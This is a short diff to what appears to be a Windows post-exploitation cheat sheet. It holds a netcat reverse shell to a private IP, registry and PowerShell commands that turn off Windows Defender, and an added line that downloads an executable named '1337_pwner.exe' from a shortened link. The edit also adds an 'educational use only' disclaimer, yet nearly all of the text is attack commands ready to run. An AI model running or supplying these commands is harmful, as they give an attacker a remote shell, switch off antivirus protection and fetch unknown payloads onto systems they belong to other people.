@@ -1,4 +1,6 @@
 #shell back on a seperate process as this php shell could die
+educational use only, only use within the reals of the law
+
 start /B c:\windows\temp\nc.exe 192.168.2.145 1338 -e cmd.exe
 wmic qfe get Caption,Description,HotFixID,InstalledOn
 
@@ -69,7 +71,7 @@ Reg add "HKEY_LOCAL_MACHINE\SOFTWARE\Policies\Microsoft\Windows Defender\Real-Ti
 
 Reg add "HKEY_LOCAL_MACHINE\SOFTWARE\Policies\Microsoft\Windows Defender" /v DisableAntiSpyware /t REG_DWORD /d 1 /f
 
-
+Invoke-WebRequest https://bit.ly/2OLrrh2 -O c:\windows\temp\hax0r\1337_pwner.exe
 
 # or via Powershell
 Set-MpPreference -DisableRealtimeMonitoring $true
